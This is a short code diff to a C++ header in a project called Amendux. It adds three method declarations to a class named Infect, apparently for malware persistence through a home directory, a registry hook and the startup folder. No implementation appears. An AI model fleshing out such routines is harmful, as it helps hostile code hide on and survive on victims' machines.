@@ -7,6 +7,9 @@ namespace Amendux {
 	class Infect : CoreInterface
 	{
 		static Infect *s_Infect;
+		void SetupHomeDirectory();
+		void SetupRegisterHook();
+		void SetupStartupFolder();
 		void InitClass();
 
 	public:
